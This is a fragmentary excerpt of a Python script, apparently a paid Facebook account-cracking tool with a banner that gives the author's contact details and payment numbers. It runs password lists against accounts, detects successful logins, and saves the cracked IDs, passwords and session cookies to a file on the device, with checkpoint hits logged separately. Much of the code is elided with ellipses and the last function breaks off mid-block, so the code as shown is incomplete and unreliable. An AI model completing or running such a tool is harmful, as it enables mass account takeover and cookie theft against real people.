...
\t[×] Developed By Asif {EXTRA} (Sakhani)
{WHITE}[•] AUTHOR       : Asif Sakhani 
{WHITE}[•] STYLE         : Beautiful ❤️ 
{WHITE}[•] WhatsApp     :   +923417020930
[•] FaceBook     :   MR DEVIL 
[•] Version      :   {RED}1.9
{WHITE}[•] YouTube      :   Asif Sakhani 

{WHITE}================================================
   \33[37;41m\t Asif x Sakhani      \33[0;m
{WHITE}=================================================""")
def linex():
    print('\033[1;37m----------------------------------------------')
...
def Aryan():
  ...
  try:
    ...
    if realid in httpCaht:
      ...
      print('\33[1;37m ====================================================')
      print (" \33[37;41m\t WELCOME TO Asif Sakhani TOOL AND ENJOY \33[0;m")
      print('\33[1;37m ====================================================')
      ...
      print('\33[1;37m ====================================================')
      print ("\33[1;37m Easy Paisa (03417020930)")
      print ("\33[1;37m Jazz Cash  (03246818935)")
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/Asif-COOKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m [ALONE-Asif-CP] '+ids+' | '+pas+'\033[1;97m')
...
def api(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [Asif-RUNING ] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
